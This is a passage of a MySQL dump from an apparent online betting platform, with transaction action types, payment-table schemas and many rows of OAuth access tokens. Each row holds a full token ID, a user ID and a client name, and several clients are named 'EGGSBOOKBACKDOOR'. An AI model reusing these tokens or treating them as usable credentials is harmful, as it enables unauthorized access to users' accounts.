(12, 'Bonus 10% discount on daily recharge'),
(13, 'Bonus 10% Deposit (Reload)'),
(14, 'Buy Ticket'),
(15, 'Get Reward'),
(16, 'Withdraw Voucher'),
(17, 'Buy Ticket Tournament'),
(31, 'Deposit AG Game'),
(32, 'Withdraw AG Game'),
(57, 'Buy Agency BO'),
(58, 'BO Commission'),
(60, 'Commission Buy Agency'),
(63, 'Buy Agency 123BetNow'),
(64, 'Commission Agency 123BetNow'),
(65, 'IB Commission 123BetNow'),
(66, 'IB Same Level 123BetNow'),
(67, 'Refund 123BetNow'),
(68, 'Buy Package Agency'),
(73, 'Buy Insurrance'),
(74, 'Increament Insurrance'),
(75, 'Deposit WM555'),
(76, 'Withdraw WM555'),
(77, 'Withdraw Bonus'),
(78, 'Reset Balance Bonus'),
(79, 'Deposit 789API'),
(80, 'Withdraw 789API'),
(81, 'Top Leader'),
(82, 'Swap'),
(83, 'Top Trader'),
(84, 'Depost Agin'),
(85, 'Withdraw Agin'),
(86, 'Promotion'),
(87, 'Deposit Evo'),
(88, 'Withdraw Evo'),
(89, 'Deposit Awc'),
(90, 'Withdraw Awc '),
(91, 'Deposit SBOBET'),
(92, 'Withdraw SBOBET'),
(93, 'Deposit SBOBET LUCKY'),
(94, 'Withdraw SBOBET LUCKY'),
(95, 'Promotion Gift Code'),
(96, 'Withdrawal occurs'),
(97, 'Deposit to member add'),
(98, 'Withdraw from member add');

-- --------------------------------------------------------

--
-- Table structure for table `money_1vnp`
--

DROP TABLE IF EXISTS `money_1vnp`;
CREATE TABLE IF NOT EXISTS `money_1vnp` (
  `Money_1VPN_ID` int(11) NOT NULL,
  `Money_1VPN_User` int(11) NOT NULL,
  `Money_1VPN_Amount` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `Money_1VPN_Fee` decimal(18,8) NOT NULL,
  `Money_1VPN_Rate_VNDUSDT` decimal(18,8) NOT NULL,
  `Money_1VPN_Rate_USDTVND` decimal(18,8) NOT NULL,
  `Money_1VPN_Hash` text COLLATE utf8_unicode_ci NOT NULL,
  `Money_1VPN_Action` int(11) NOT NULL,
  `Money_1VPN_Comment` text COLLATE utf8_unicode_ci NOT NULL,
  `Money_1VPN_Channel` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `Money_1VPN_Time` bigint(20) NOT NULL,
  `Money_1VPN_Currency` varchar(10) COLLATE utf8_unicode_ci NOT NULL,
  `Money_1VPN_MoneyID` int(11) DEFAULT NULL,
  `Money_1VPN_Status` int(11) NOT NULL,
  `Money_1VPN_Bank_Code` text COLLATE utf8_unicode_ci,
  `Money_1VPN_Bank_Number` text COLLATE utf8_unicode_ci,
  `Money_1VPN_Beneficiary_Name` text COLLATE utf8_unicode_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `money_channel_1vnp`
--

DROP TABLE IF EXISTS `money_channel_1vnp`;
CREATE TABLE IF NOT EXISTS `money_channel_1vnp` (
  `money_channel_id` int(11) NOT NULL,
  `money_channel_name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `money_channel_code` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `money_channel_status` int(11) NOT NULL,
  `money_channel_deposit` int(11) NOT NULL,
  `money_channel_withdraw` int(11) NOT NULL,
  `money_channel_fee_deposit` float NOT NULL,
  `money_channel_fee_withdraw` float NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `notification`
--

DROP TABLE IF EXISTS `notification`;
CREATE TABLE IF NOT EXISTS `notification` (
  `id` int(11) NOT NULL,
  `image` varchar(255) CHARACTER SET utf8 NOT NULL,
  `landing` int(1) DEFAULT NULL,
  `system` int(1) DEFAULT NULL,
  `promotion` int(11) DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `oauth_access_tokens`
--

DROP TABLE IF EXISTS `oauth_access_tokens`;
CREATE TABLE IF NOT EXISTS `oauth_access_tokens` (
  `id` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `client_id` int(11) NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `scopes` text COLLATE utf8mb4_unicode_ci,
  `revoked` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `expires_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `oauth_access_tokens`
--

INSERT INTO `oauth_access_tokens` (`id`, `user_id`, `client_id`, `name`, `scopes`, `revoked`, `created_at`, `updated_at`, `expires_at`) VALUES
('001c7c209c684d0a037b16add3e30a1aa4222631960197b66f0c87b6592040ef70a68ef29a925e27', '685658', 5, 'WINBOSS', '[]', 0, '2022-12-08 08:00:26', '2022-12-08 08:00:26', '2023-12-08 08:00:26'),
('003410fa39c5bd46ca7ffcb0527b19a044dd4b54c2fdafd4c28b548acb58ddd075a4eba36e5e8aa9', '842343', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:40:50', '2022-09-01 05:40:50', '2023-09-01 05:40:50'),
('0053bb8882972025f373efc98c85d525224f34358aef79ffd9d4a0dd56b0d9466e876d3afdfae63d', '554262', 5, 'WINBOSS', '[]', 0, '2024-01-19 14:58:02', '2024-01-19 14:58:02', '2025-01-19 14:58:02'),
('005c99f30ea69247b61a6e3ba1cedb0ce5fb9e3928f3fd90ee465e54ac2c30cd472ced2b020dbf4b', '189670', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2024-01-21 04:52:13', '2024-01-21 04:52:13', '2025-01-21 04:52:13'),
('013722c12fe26cd4249bd91697eac762b9588d0c7994353f81fbf888d3cbce58150137ce480f91d7', '776773', 5, 'WINBOSS', '[]', 0, '2023-04-14 11:01:58', '2023-04-14 11:01:58', '2024-04-14 11:01:58'),
('017507a3a177f39451d8960307b5bb3d0965c6fe58747144f6ed2db1cb840869db74ca716ff2700a', '931063', 5, 'WINBOSS', '[]', 0, '2023-08-22 03:02:34', '2023-08-22 03:02:34', '2024-08-22 03:02:34'),
('017b405ef2326b03b77b9660a394712748f43a91e7533feac3be0f0f852ad1b716fff3be486cd247', '646239', 5, 'WINBOSS', '[]', 0, '2023-09-04 07:13:36', '2023-09-04 07:13:36', '2024-09-04 07:13:36'),
('0180a7aecdd2e0255c57ef6c84b802c279b77212b4758dac4300d59c9db115d063f2a462292c6cef', '206843', 5, 'WINBOSS', '[]', 0, '2023-04-25 03:54:27', '2023-04-25 03:54:27', '2024-04-25 03:54:27'),
('02108edca5131b3a878deb116374fb8e9d62f3f7b6dd47fd9666ceb91e21866697cda0c02fbbdb98', '218347', 5, 'WINBOSS', '[]', 0, '2022-08-16 07:25:36', '2022-08-16 07:25:36', '2023-08-16 07:25:36'),
('0227d4761a56e5cbc75da5cbd56421e50ec6af7029205fa99e6caf407b77435adb1fdbf8183206b8', '678038', 5, 'WINBOSS', '[]', 0, '2022-08-23 10:08:43', '2022-08-23 10:08:43', '2023-08-23 10:08:43'),
('0287fa0832c0dbaeb6609a094e8b47b545ba3387d2ffeb7881f2711a2f0fc73a72ffbc0177735b0d', '570853', 5, 'WINBOSS', '[]', 0, '2023-09-12 08:32:46', '2023-09-12 08:32:46', '2024-09-12 08:32:46'),
('02b54bcfe0b5fe4154fbf8f5b04ad6db95be7709e06ffb29bd260634190f030bba4224ff7979bf4f', '457088', 5, 'WINBOSS', '[]', 0, '2023-10-21 15:44:42', '2023-10-21 15:44:42', '2024-10-21 15:44:42'),
('02c1606a4e87486f4a12452618dd4127fa940c5ccb3f8585415b33d92801b4a0064dd6ccaf77cfc5', '168438', 5, 'WINBOSS', '[]', 0, '2023-07-21 14:17:16', '2023-07-21 14:17:16', '2024-07-21 14:17:16'),
('0330ccd0d2226a17d363a43a675fc3e994e824f8e40ffa4aab151aaa08d401f303c3270d4feac808', '974298', 5, 'WINBOSS', '[]', 0, '2023-11-17 16:27:13', '2023-11-17 16:27:13', '2024-11-17 16:27:13'),
('0398ebeac683ec6eea4e8f0c1909de002f1ec6dbeed5c6429da7fb711353d12145ab839c82a6c2fc', '266675', 5, 'WINBOSS', '[]', 0, '2023-01-17 04:49:21', '2023-01-17 04:49:21', '2024-01-17 04:49:21'),
('03a3272fb0e18b9f6d496e701069550e3184dd4697eb0c124064ff934a911500d6cfa76dc14b8823', '628402', 5, 'BeTNoW', '[]', 0, '2022-12-01 07:23:58', '2022-12-01 07:23:58', '2023-12-01 07:23:58'),
('03bf5a011b998c8fde25ed836603a3032c47c64720b5cab8af2321f38f80f1a70dd405ccb89dc502', '996206', 5, 'WINBOSS', '[]', 0, '2024-01-01 14:39:26', '2024-01-01 14:39:26', '2025-01-01 14:39:26'),
('03df34565d26b905f07fcbc0dd77f842585fd774878248a77770abdf07cbeba42bd12d2bf53802a7', '668223', 5, 'WINBOSS', '[]', 0, '2022-12-25 19:18:37', '2022-12-25 19:18:37', '2023-12-25 19:18:37'),
('03e78eb10548734c992230f30be38d712b3b283dc5d0ad87063dda1d67bb7b04c79d0765a7e2aac8', '483106', 5, 'WINBOSS', '[]', 0, '2023-01-21 06:23:19', '2023-01-21 06:23:19', '2024-01-21 06:23:19'),
('041cea1b331e3af7e07c03943a91ab67dd560660bf6fe001b3bbf9606147ec82f71a8503f3d9166a', '539181', 5, 'WINBOSS', '[]', 0, '2023-11-24 06:31:53', '2023-11-24 06:31:53', '2024-11-24 06:31:53'),
('0459165af83d4211e491e0634c21b0fe69c91d8a69d68352c6f4180b84e0777c587b2dd8e82fe9b1', '969904', 5, 'WINBOSS', '[]', 0, '2023-10-22 10:00:19', '2023-10-22 10:00:19', '2024-10-22 10:00:19'),
('047d84b3e5f2d41556f2cf832f2a0b5df29b149de08a2262a530cd2f2e53a69605153fed742f9b1d', '598301', 5, 'WINBOSS', '[]', 0, '2022-12-17 10:42:00', '2022-12-17 10:42:00', '2023-12-17 10:42:00'),
('0493050b9046b2057b70fa2c3a4c74bb05a6f7d85a8819be642ec9ed4ffc07b52afadc5559dd873b', '307596', 5, 'WINBOSS', '[]', 0, '2022-12-28 18:44:55', '2022-12-28 18:44:55', '2023-12-28 18:44:55'),
('04a78f345a973f47d7e1651b938e420d287a06333d92daa0eaa596dd247cec0074d4b061ba43d96a', '371354', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:27:32', '2024-01-22 04:27:32', '2025-01-22 04:27:32'),
('04a8edb809cbe50b8c14ad5e677208ee97d8fc7e36b0bf384a292ccea41020e4ae05e191d17127b7', '709942', 5, 'WINBOSS', '[]', 0, '2024-01-15 02:10:34', '2024-01-15 02:10:34', '2025-01-15 02:10:34'),
('04c2cb23e82f0cb2e1e5f712b07693efdc8cf122b877d03850acce6767ad4d18dc93e37f0f9823a5', '716846', 5, 'WINBOSS', '[]', 0, '2022-08-03 18:00:26', '2022-08-03 18:00:26', '2023-08-03 18:00:26'),
('04d51875b07fa60b8ca96d25b24384e74a5223718014da67fba4844eab993a8261e2932743e2fb53', '845712', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:56:10', '2024-01-22 04:56:10', '2025-01-22 04:56:10'),
('04fb70455fd9f6ea161e1e27f2882e42a9f02e4195966af421a0dca051ccab038d5c05252d99eb47', '150252', 5, 'WINBOSS', '[]', 0, '2022-10-01 10:43:56', '2022-10-01 10:43:56', '2023-10-01 10:43:56'),
('0504b3b3fdbc3036348a0458824e8bc8d41526e5983f85eb274e611b2fcd12d721379297ba277f6f', '955939', 5, 'WINBOSS', '[]', 0, '2022-12-25 20:59:35', '2022-12-25 20:59:35', '2023-12-25 20:59:35'),
('05253ae539398b1f9106ae3b0d5b78ca6ded401399e7eb3c1a2802364c7e90b476cb27b40f8c35d2', '285448', 5, 'WINBOSS', '[]', 0, '2024-01-05 15:17:37', '2024-01-05 15:17:37', '2025-01-05 15:17:37'),
('05397f709f2fbc724f18299c41c32040bbffecfbc0bb218ee1b0a33bcdd8261573f8aaeae5244d42', '728858', 5, 'WINBOSS', '[]', 0, '2023-01-17 08:58:07', '2023-01-17 08:58:07', '2024-01-17 08:58:07'),
('053f66786f5e1c65bae12db0c8e5e034049a87ef828bc8971c9c7fe0340a399f16b027513a44f9ed', '389487', 5, 'WINBOSS', '[]', 0, '2023-03-23 01:57:26', '2023-03-23 01:57:26', '2024-03-23 01:57:26'),
('0549bdc4a7179507f5f2245dd5d439774c13c5c8567961a6bb2fd0c229cd48ad66eccc7c2aa19a04', '362443', 5, 'WINBOSS', '[]', 0, '2023-06-24 03:48:40', '2023-06-24 03:48:40', '2024-06-24 03:48:40'),
('05bf2948b8953adccc3e56d6c1a3cd8d5e04a559e2d36c9e44d18a848eba2642fd7f9d881e791d5a', '107293', 5, 'WINBOSS', '[]', 0, '2023-12-18 14:08:35', '2023-12-18 14:08:35', '2024-12-18 14:08:35'),
('05fe67ee280a4cfdb61eda0f26e6da28f65c3bce2c6f97ad0902c1ae2b3ac3a7fa0e5bb3e9f0dd51', '106674', 5, 'WINBOSS', '[]', 0, '2022-07-15 08:07:08', '2022-07-15 08:07:08', '2023-07-15 08:07:08'),
('069adf294a735cd677861329f32c2ab79ca7695422b4dd75e7e8f36fd4b18c87a452f0e07f330ca6', '545934', 5, 'WINBOSS', '[]', 0, '2023-04-25 03:02:44', '2023-04-25 03:02:44', '2024-04-25 03:02:44'),
('073aeac8b9757274c07b307d3b21bc0517ad92ef1511eb75a59d6592286eb1445ebc8637ef20f103', '266053', 5, 'WINBOSS', '[]', 0, '2023-10-14 03:36:09', '2023-10-14 03:36:09', '2024-10-14 03:36:09'),
('078867d3360727819121657a0c8032c9a59a80913c56a6020c7622301dd892042087da84e7a6d0f7', '739138', 5, 'WINBOSS', '[]', 0, '2022-12-25 18:57:11', '2022-12-25 18:57:11', '2023-12-25 18:57:11'),
('08324c60d9a08f810c59abaabec638ba6454e4c4aee4dbfa48ceea005d88f9c7cbe40a07cb059a86', '751811', 5, 'WINBOSS', '[]', 0, '2024-01-17 05:14:30', '2024-01-17 05:14:30', '2025-01-17 05:14:30'),
('08cf4f26ef1f63225e44d7bb2005b5784b3077eff5376b84c6c03e29423420b90d80ef04794efc2a', '901465', 5, 'WINBOSS', '[]', 0, '2023-03-04 08:10:29', '2023-03-04 08:10:29', '2024-03-04 08:10:29'),
('091ae61698e083b896736519e79f2dd49478b877c2e5d86f73204efbf29567461753391e590c8af4', '263531', 5, 'WINBOSS', '[]', 0, '2022-12-08 02:21:44', '2022-12-08 02:21:44', '2023-12-08 02:21:44'),
('097f87dc8630c0f881ab3cc48adf2b23929c98c813e2510bf16355e3d0004a484e5fa0ca02c299ef', '281559', 5, 'WINBOSS', '[]', 0, '2022-12-26 18:47:07', '2022-12-26 18:47:07', '2023-12-26 18:47:07'),
('098b889b6bf348bcda5ce2bbb94ae5c9224fdfdadf359f796261511eca6052bba5cbf7c218a43035', '592204', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-09-25 05:47:20', '2023-09-25 05:47:20', '2024-09-25 05:47:20'),
('09bdccff10073ea12855f6fe3d519584d87fadc89d1be16ccac8d9eece2fae312e14c270757bf93a', '195273', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-30 06:31:11', '2023-12-30 06:31:11', '2024-12-30 06:31:11'),
('09c8a0de966062508dce706f70cec057e8a00d6b3f81befbfcd8fa98cfdd19e0103bb3fee71d1320', '422699', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-28 02:50:00', '2022-11-28 02:50:00', '2023-11-28 02:50:00'),
('09de0799c966e51c52320562ef0226b0778eb4ad2df801d227c284c664001e155a2b22b9c6bc80b3', '569549', 5, 'WINBOSS', '[]', 0, '2022-12-09 11:18:50', '2022-12-09 11:18:50', '2023-12-09 11:18:50'),
('0a4e9135cfb31686738e2eefc38aac03033ffef3295f9b3ac82581d4a0909eae65275abd053c1b5c', '914683', 5, 'WINBOSS', '[]', 0, '2022-09-19 09:35:05', '2022-09-19 09:35:05', '2023-09-19 09:35:05'),
('0a7a7e73d9aebccbf3902339c1cee3da4823d05b02822830169f36d6c70a9853e7a1dff1ddb8b836', '581632', 5, 'WINBOSS', '[]', 0, '2023-10-09 09:40:31', '2023-10-09 09:40:31', '2024-10-09 09:40:31'),
('0b3a0c6ebe29b0a75c77d45ea903f50a9f8c7bb306ab5c63d32cfc1ef99ddc09553d9e641533fea8', '929437', 5, 'WINBOSS', '[]', 0, '2022-10-31 03:15:55', '2022-10-31 03:15:55', '2023-10-31 03:15:55'),
('0b46f2d0c3bdebc1b6062a4a4510d3cf99c539797868f28b6f71b1ce5e41678b89c81cbde05a7158', '895899', 5, 'WINBOSS', '[]', 0, '2023-06-09 22:16:59', '2023-06-09 22:16:59', '2024-06-09 22:16:59'),
('0b4a65bbcb429b9933442a0da595b69d640f618520e7ab90c25ea32a630bbb85c825861ea3cd9047', '247943', 5, 'BeTNoW', '[]', 0, '2022-11-21 04:16:47', '2022-11-21 04:16:47', '2023-11-21 04:16:47'),
('0b6c84ed434452c7b302229da94ebfd556ad761e78d0553af476df99dfcfbfc23064dd264ee4e9fa', '256163', 5, 'WINBOSS', '[]', 0, '2022-09-16 08:03:08', '2022-09-16 08:03:08', '2023-09-16 08:03:08'),
('0bb33e2f015fc3fd539bd0fdeeb69459415131255950be0edfca1fc65a44dba83abae01d4214970e', '453241', 5, 'WINBOSS', '[]', 0, '2024-01-05 15:23:52', '2024-01-05 15:23:52', '2025-01-05 15:23:52'),
('0be621e9570cfdf6edcc19852ec42085da98f2931fd54f162c4eabd9ea4de7f26b1448cb6dbf5ebc', '161975', 5, 'WINBOSS', '[]', 0, '2023-12-07 07:05:57', '2023-12-07 07:05:57', '2024-12-07 07:05:57'),
('0bf53303b8c9b59171ca1af5a5eba696c45ec9cad3a38e7c624a1d0a7e70df44f40aa5ca5266fbf9', '741591', 5, 'WINBOSS', '[]', 0, '2022-12-23 08:32:18', '2022-12-23 08:32:18', '2023-12-23 08:32:18'),
('0c2f44244cb31c55398e9f41c9152c318d3eac45bda930b58a271de4ec054b4b3ce6686cb12f0a77', '234627', 5, 'WINBOSS', '[]', 0, '2023-07-07 15:23:53', '2023-07-07 15:23:53', '2024-07-07 15:23:53'),
('0c95e407c294331a3ea8187357a798868f9ce37a2bd359a0f074dea5f66981ab6ea7d4a22e5e5483', '143410', 5, 'WINBOSS', '[]', 0, '2022-12-26 04:33:19', '2022-12-26 04:33:19', '2023-12-26 04:33:19'),
('0ca1a64b795951ba9d0ca79c9f7efff5f2efa8c4deacb9f319c7c134de21295a98d5f0de569b3972', '799606', 5, 'WINBOSS', '[]', 0, '2023-01-03 07:57:42', '2023-01-03 07:57:42', '2024-01-03 07:57:42'),
('0cae8a2bbd303d9326973199182becaad20102078aa74d960c5acec47959d61bd02d7d27e555ba99', '805705', 5, 'WINBOSS', '[]', 0, '2022-12-05 02:05:40', '2022-12-05 02:05:40', '2023-12-05 02:05:40'),
('0cdb76eb65118f5b80d44f24815d75702f63a0bbba5b84acc4ad8c03e74908134a7c91e09fc4042f', '445762', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:37:17', '2024-01-22 04:37:17', '2025-01-22 04:37:17'),
('0cdf3d5f3779d8385b4f635fe8802f65ff5f81b5860d58813a941795a2d7d2cbe488c0d497604391', '988066', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-05-31 03:30:36', '2023-05-31 03:30:36', '2024-05-31 03:30:36'),
('0ce5c47d9fc6cb71ee9a4e30538bb12261a644ac523ab650341fc4a8997703ecf00c9c0a8d70458e', '195273', 5, 'WINBOSS', '[]', 0, '2023-12-29 09:06:52', '2023-12-29 09:06:52', '2024-12-29 09:06:52'),
('0cefb5622f7c0c96c0fb384c689d81de8808080041d5d1025e9dc80453cc54ab9c533a6094c66236', '673122', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:25:38', '2022-06-28 08:25:38', '2023-06-28 08:25:38'),
('0d23c7b28a0c8420b237bf2e7a8a19933bdf0f8e8d7992d4a621b2c693bcac8163ce2ed348c61312', '639829', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-02 03:20:20', '2022-11-02 03:20:20', '2023-11-02 03:20:20'),
('0d588ba88cbf5f2dffd56bac66a2b21b84c4c0b15db9cb15a55bb777cb1b13d90f3c30055454f9c8', '644118', 5, 'WINBOSS', '[]', 0, '2022-12-09 03:26:35', '2022-12-09 03:26:35', '2023-12-09 03:26:35'),
('0d69a3f1397a071c7e6031c9de2963cf1ea1db2412001cf769b169457b93c2bdbcb3e0c938caad77', '536087', 5, 'WINBOSS', '[]', 0, '2023-02-10 15:03:16', '2023-02-10 15:03:16', '2024-02-10 15:03:16'),
('0d6c2b5beb8ee52ad61b64f6ad9bbe38bc7c3f95e6c3f9825047993d726d5b64f77dacced38c5ba6', '900922', 5, 'WINBOSS', '[]', 0, '2023-07-26 20:46:08', '2023-07-26 20:46:08', '2024-07-26 20:46:08'),
('0d729e8a7179bee3dfc0d4b78a1b5836fdb34fee1b4eb815706af7f34d7f15f9a0141a904c66fb29', '288639', 5, 'WINBOSS', '[]', 0, '2023-07-04 23:46:19', '2023-07-04 23:46:19', '2024-07-04 23:46:19'),
('0dca52304818f98330a847cb462f88cf1e0d5d12627fb37da5347d74083504dd53b02bd5c6280875', '599540', 5, 'WINBOSS', '[]', 0, '2023-08-08 16:32:11', '2023-08-08 16:32:11', '2024-08-08 16:32:11'),
('0ddde890f1efa612b1c695bc74a58adbd0352c028e9358dcbb54892afabb8f73d8eaf9fd8837ee5a', '987637', 5, 'WINBOSS', '[]', 0, '2022-07-21 04:09:15', '2022-07-21 04:09:15', '2023-07-21 04:09:15'),
('0de1ecfa1cf1729e88fe3e11cb78cfebb5526b8704bfc1bf1f8b92f621d7260e222cc25009f38e8d', '450553', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-09-25 05:48:54', '2023-09-25 05:48:54', '2024-09-25 05:48:54'),
('0e0ec7dcf087a31045a7458d8ec47b86658905965bddbd9aaa6b96867a6264996570fc7addec8b32', '839248', 5, 'WINBOSS', '[]', 0, '2023-08-03 04:29:42', '2023-08-03 04:29:42', '2024-08-03 04:29:42'),
('0e17e2c6fdf09eeedb16c26f8fc12688bd59777c3d56820064a43882ddcfba552130b440ef60f7dc', '291988', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:19:08', '2022-06-28 08:19:08', '2023-06-28 08:19:08'),
('0e56965a647c1532cd53a6a1f2ab6f11d1ddfe3fc4c90e4523a1a0a205f397deb61d9d3e38ed894c', '799543', 5, 'WINBOSS', '[]', 0, '2023-03-19 09:44:51', '2023-03-19 09:44:51', '2024-03-19 09:44:51'),
('0e7be8d2688fcf654324a5637f390749a31850898a4dd9326bd62feed1bebd246570a18b416ffd1b', '827086', 5, 'WINBOSS', '[]', 0, '2023-07-19 11:27:15', '2023-07-19 11:27:15', '2024-07-19 11:27:15'),
('0e85bb6305beb6e1f6aa4664b69f2f0096baeed532f46b5b6e035a6971e36a238ba1dd782af15343', '257995', 5, 'WINBOSS', '[]', 0, '2022-11-05 15:39:02', '2022-11-05 15:39:02', '2023-11-05 15:39:02'),
('0e9155de5c90d10befbb18ab51f052bc5b7db7f500c7c25cd7e5bf2737631f1feb82a2b6fdd283c8', '395783', 5, 'WINBOSS', '[]', 0, '2023-02-04 17:07:53', '2023-02-04 17:07:53', '2024-02-04 17:07:53'),
('0edfd81f98e04596947c2ae59f664b5ac40d495d69f63bdd62563cf89289766953faae2a6a50143e', '442776', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-08-08 07:12:41', '2023-08-08 07:12:41', '2024-08-08 07:12:41'),
('0f63528572a67d6457f3930e019aa892f1e76372f3826f0ba91f0183cc331ae04fc23016a30f973f', '462331', 5, 'WINBOSS', '[]', 0, '2024-01-17 10:05:29', '2024-01-17 10:05:29', '2025-01-17 10:05:29'),
('0f6eac73277dd136f68736ce2ea919bfb09a0fa79e5fd507886deca3198171cdc3942472e7a9ff85', '526485', 5, 'WINBOSS', '[]', 0, '2022-12-15 09:11:06', '2022-12-15 09:11:06', '2023-12-15 09:11:06'),
('0f72ff76af9440d88161859bb4db0ba94f952c3b49c7cee751ece93285664e420d53cbd159293693', '270915', 5, 'WINBOSS', '[]', 0, '2023-01-03 19:05:58', '2023-01-03 19:05:58', '2024-01-03 19:05:58'),
('0f8bb32e6b3d43a6cdf7988c9a8207a2635b6399efee2129be7536d25b27bf57d38da6d8d933e899', '927326', 5, 'WINBOSS', '[]', 0, '2023-09-29 07:23:21', '2023-09-29 07:23:21', '2024-09-29 07:23:21'),
('0fbc5cd692ab3689152b01b46dd8fa311d33f68845e85130be93e4812cde3a03d4fb2f29f668ec24', '312633', 5, 'WINBOSS', '[]', 0, '2022-12-05 02:12:42', '2022-12-05 02:12:42', '2023-12-05 02:12:42'),
('0fc07c731e0bdd572115fbbe98a75e03bf79729dec5611143817d97e791ff01ed75c21a92ef6f44d', '487763', 5, 'WINBOSS', '[]', 0, '2022-12-11 15:59:52', '2022-12-11 15:59:52', '2023-12-11 15:59:52'),
('0fd5ba18b71c116fb8c7d0b31d7dc61ef9bce9cc44b683c1edb9f932b42b7c371a5684b810c45976', '155660', 5, 'WINBOSS', '[]', 0, '2023-05-31 05:46:14', '2023-05-31 05:46:14', '2024-05-31 05:46:14'),
('100631182eaec9b0d0797c2e6dd377a8c7a11a91d8f17c693963889ac7066fa42b594157f37b28a3', '442264', 5, 'WINBOSS', '[]', 0, '2023-04-05 04:31:07', '2023-04-05 04:31:07', '2024-04-05 04:31:07'),
('103bdda035042cc14b1c3eca32d9c769e106d4b2cc506a3af99a22924c12ec07ee1be3d0450723df', '880902', 5, 'WINBOSS', '[]', 0, '2023-10-05 09:45:52', '2023-10-05 09:45:52', '2024-10-05 09:45:52'),
('1055d215e834e672b68fd66687630725f6e17485acb6447f492f21e2f027761ac484825f08fc98fd', '896794', 5, 'WINBOSS', '[]', 0, '2022-12-19 01:34:06', '2022-12-19 01:34:06', '2023-12-19 01:34:06'),
('107b64d708058fefc863abc60f12eb6d6419f0648af6dead2749ddedb68fad4c5588c136086d362d', '364105', 5, 'WINBOSS', '[]', 0, '2023-08-25 09:09:21', '2023-08-25 09:09:21', '2024-08-25 09:09:21'),
('10d02152092fb0871e6729ba19ac0f8d567f9462bb23e3bbc56a3a6c93a65173459b714f2e1effd9', '128659', 5, 'WINBOSS', '[]', 0, '2022-12-26 16:00:57', '2022-12-26 16:00:57', '2023-12-26 16:00:57'),
('112ea80606c31322d5f28e28b9d9bb440e7c4363ff7f23e2c37d2fc141b8b933b324b2dcc675c1a8', '292514', 5, 'WINBOSS', '[]', 0, '2023-06-12 13:13:20', '2023-06-12 13:13:20', '2024-06-12 13:13:20'),
('11cdeba60741381ee16a4ca991ab85e65ccada102c1aa05fee8cc71d646ba19516a25259d4df90bc', '643270', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-21 03:21:08', '2022-11-21 03:21:08', '2023-11-21 03:21:08'),
('1230b968ec9b4c570a891ff4d923244744b20cf91d056c5684f9aaf09c51e6bdcc28364e2e53a1d8', '771386', 5, 'WINBOSS', '[]', 0, '2022-12-08 02:26:09', '2022-12-08 02:26:09', '2023-12-08 02:26:09'),
('125eb22ba938cfb044f828f2d09b407f0c6e8c6aca68c435291360ccd70a0cd77bfe4cfd724bcdd4', '797655', 5, 'WINBOSS', '[]', 0, '2023-05-27 04:17:49', '2023-05-27 04:17:49', '2024-05-27 04:17:49'),
('12739e6f31620232948723cb268fba8cc887ec1fb01b1de4ddf2e8038cab43876cb32e8e9fe917c3', '809409', 5, 'WINBOSS', '[]', 0, '2023-01-14 14:09:15', '2023-01-14 14:09:15', '2024-01-14 14:09:15'),
('133f1a3b71c7f1c3c7ea7c8b1fef23027efef5002aebeb6b3859dfa715ab7b281d24a0ca06acaab3', '499347', 5, 'WINBOSS', '[]', 0, '2022-12-27 18:11:36', '2022-12-27 18:11:36', '2023-12-27 18:11:36'),
('13728acf634eb09a91810d06a3f67937c55c0ea94e00084fd7743ff72842c1fda13e86efc094cc98', '939601', 5, 'WINBOSS', '[]', 0, '2023-09-01 06:55:12', '2023-09-01 06:55:12', '2024-09-01 06:55:12'),
('1390b4565730f6fb886099cc597837b564f6b90b54989823f71c042781aafee7952591d7e73ddf22', '939325', 5, 'WINBOSS', '[]', 0, '2022-12-07 17:18:58', '2022-12-07 17:18:58', '2023-12-07 17:18:58'),
('139523896b4b9d14e82ec5b86a94a691f16047dafd50782aef54cf13761f0ce0692ff3a78311e1c8', '852818', 5, 'WINBOSS', '[]', 0, '2023-05-04 15:51:05', '2023-05-04 15:51:05', '2024-05-04 15:51:05'),
('13af3333f1206345c8786c1929cfaeca5ffc642b9f934392988a90023349f9b311ee71e14c6c165f', '746747', 5, 'WINBOSS', '[]', 0, '2022-12-25 22:21:04', '2022-12-25 22:21:04', '2023-12-25 22:21:04'),
('13bfe2580d6f84c5963438628c3be430066891c2fbabef9dbba978f677417fcd44fd254236d78358', '920912', 5, 'WINBOSS', '[]', 0, '2023-07-12 04:23:38', '2023-07-12 04:23:38', '2024-07-12 04:23:38'),
('13ee84c479c33a03e82205d6fbf51c6bf627d2dda9cfdb64a48f05fedc38551f16a5639f246f5529', '988066', 5, 'WINBOSS', '[]', 0, '2022-09-04 09:25:01', '2022-09-04 09:25:01', '2023-09-04 09:25:01'),
